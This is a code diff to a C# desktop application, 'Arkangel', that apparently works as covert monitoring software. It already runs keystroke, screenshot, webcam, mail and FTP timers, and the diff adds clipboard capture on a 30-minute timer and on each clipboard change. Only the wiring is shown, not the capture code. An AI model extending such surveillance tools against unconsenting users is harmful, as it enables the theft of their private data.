@@ -8,6 +8,7 @@ using System.Diagnostics;
 using System.Timers;
 using System.Data.SQLite;
 using System.IO;
+using static Arkangel.ClipboardHelper;
 
 namespace Arkangel
 {
@@ -20,6 +21,7 @@ namespace Arkangel
         private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
 
         [DllImport("user32.dll")]
+
 
         private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
         private const int HOTKEY_ID = 9000;
@@ -40,6 +42,10 @@ namespace Arkangel
         public static System.Timers.Timer aTimer_sendMail = new System.Timers.Timer();
         //FTP
         public static System.Timers.Timer aTimer_FTP = new System.Timers.Timer();
+        //CLipboard
+        public static System.Timers.Timer aTimer_Clipboard = new System.Timers.Timer();
+        //Website
+        public static System.Timers.Timer aTimer_Website = new System.Timers.Timer();
 
         public MainWindow()
         {
@@ -52,8 +58,7 @@ namespace Arkangel
                 Dashboard dashboard = new Dashboard(this);
                 mainPanel.Children.Add(dashboard);
             }
-            Functions.syncDown();
-
+           
 
 
             //Keystroke
@@ -241,6 +246,14 @@ namespace Arkangel
             //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
 
             //Hide();
+
+            //Clipboard 
+            Functions.SetTimerClipboard(30 * 60 * 1000);
+            aTimer_Clipboard.Start();
+
+            //Website
+
+
         }
         private IntPtr _windowHandle;
         private HwndSource _source;
@@ -462,7 +475,22 @@ namespace Arkangel
             aTimer_scrshot.Stop();
             aTimer_sendMail.Stop();
             aTimer_webcam.Stop();
+            aTimer_Clipboard.Stop();
             Functions.EndTask("keystroke.exe");
+        }
+
+        private void Window_Loaded(object sender, RoutedEventArgs e)
+        {
+            ClipboardMonitor.OnClipboardChange += ClipboardMonitor_OnClipboardChange;
+            ClipboardMonitor.Start();
+        }
+        private void ClipboardMonitor_OnClipboardChange(ClipboardFormat format, object data)
+        {
+            try
+            {
+                Functions.WriteClipboard();
+            }
+            catch { }
         }
     }
 }
